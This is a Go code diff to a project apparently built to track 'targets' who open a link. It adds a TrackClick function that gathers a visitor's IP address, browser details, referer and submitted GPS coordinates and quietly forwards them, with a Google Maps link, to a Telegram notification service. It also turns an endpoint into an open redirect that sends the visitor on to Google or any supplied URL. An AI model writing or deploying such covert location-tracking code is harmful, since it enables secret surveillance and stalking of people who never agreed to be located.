@@ -1,12 +1,14 @@
 package handlers
 
 import (
+	"fmt"
 	"io"
 	"log"
 	"time"
 
 	"github.com/aws/aws-sdk-go-v2/service/s3"
 	"github.com/michaelwp/trackme/internal/config"
+	"github.com/michaelwp/trackme/internal/services"
 
 	"github.com/gofiber/fiber/v3"
 	"github.com/michaelwp/trackme/internal/models"
@@ -16,7 +18,7 @@ import (
 type targetRequest struct {
 	Location models.LocationInformation `json:"location" validate:"required"`
 	Device   models.DeviceInformation   `json:"device" validate:"required"`
-	Photo    models.Photo               `json:"photo" validate:"required"`
+	Photo    models.Photo               `json:"photo"`
 }
 
 type LocationHandler interface {
@@ -26,16 +28,18 @@ type LocationHandler interface {
 }
 
 type locationHandler struct {
-	repository repository.LocationRepository
-	s3Client   *s3.Client
-	s3Config   *config.S3Config
+	repository      repository.LocationRepository
+	s3Client        *s3.Client
+	s3Config        *config.S3Config
+	telegramService *services.TelegramService
 }
 
-func NewLocationHandler(locationRepository repository.LocationRepository, s3Client *s3.Client, s3Config *config.S3Config) LocationHandler {
+func NewLocationHandler(s3Client *s3.Client, s3Config *config.S3Config) LocationHandler {
 	return locationHandler{
-		repository: locationRepository,
-		s3Client:   s3Client,
-		s3Config:   s3Config,
+		repository:      repository.NewLocationRepository(),
+		s3Client:        s3Client,
+		s3Config:        s3Config,
+		telegramService: services.NewTelegramService(),
 	}
 }
 
@@ -47,6 +51,8 @@ func (l locationHandler) SaveLocation(c fiber.Ctx) error {
 			"error": "Invalid request body",
 		})
 	}
+
+	l.TrackClick(c, target.Location.Latitude, target.Location.Longitude)
 
 	locationModel := &models.Target{
 		Location:  target.Location,
@@ -111,20 +117,52 @@ func (l locationHandler) UploadPhoto(c fiber.Ctx) error {
 }
 
 func (l locationHandler) GetLocations(c fiber.Ctx) error {
-	locations, err := l.repository.GetAll()
-	if err != nil {
-		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
-			"error": "Failed to fetch locations",
-		})
+	//locations, err := l.repository.GetAll()
+	//if err != nil {
+	//	return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
+	//		"error": "Failed to fetch locations",
+	//	})
+	//}
+	//
+	//// Debug: Log all available document IDs
+	//log.Printf("Available document IDs in database:")
+	//for i, location := range locations {
+	//	log.Printf("  [%d] ID: %s", i, location.ID.Hex())
+	//}
+	//
+	//return c.Status(fiber.StatusOK).JSON(fiber.Map{
+	//	"locations": locations,
+	//})
+
+	targetURL := c.Query("url", "")
+	if targetURL == "" {
+		targetURL = "https://www.google.com"
 	}
 
-	// Debug: Log all available document IDs
-	log.Printf("Available document IDs in database:")
-	for i, location := range locations {
-		log.Printf("  [%d] ID: %s", i, location.ID.Hex())
-	}
+	return c.Redirect().To(targetURL)
+}
 
-	return c.Status(fiber.StatusOK).JSON(fiber.Map{
-		"locations": locations,
-	})
+func (l locationHandler) TrackClick(c fiber.Ctx, lat float64, long float64) {
+	// Get visitor information
+	ip := c.IP()
+	userAgent := c.Get("User-Agent")
+	referer := c.Get("Referer")
+	timestamp := time.Now().Format("2006-01-02 15:04:05")
+
+	// Create a notification message
+	message := fmt.Sprintf("🔗 Link Click Detected!\n\n"+
+		"Time: %s\n"+
+		"IP: %s\n"+
+		"User Agent: %s\n"+
+		"Referer: %s\n",
+		timestamp, ip, userAgent, referer)
+
+	message += fmt.Sprintf("location: https://www.google.com/maps/@%f,%f,15z?entry=ttu&g_ep=EgoyMDI1MDgxOS4wIKXMDSoASAFQAw%%3D%%3D", lat, long)
+
+	// Send Telegram notification
+	go func() {
+		if err := l.telegramService.SendNotification(message); err != nil {
+			fmt.Printf("Error sending Telegram notification: %v\n", err)
+		}
+	}()
 }
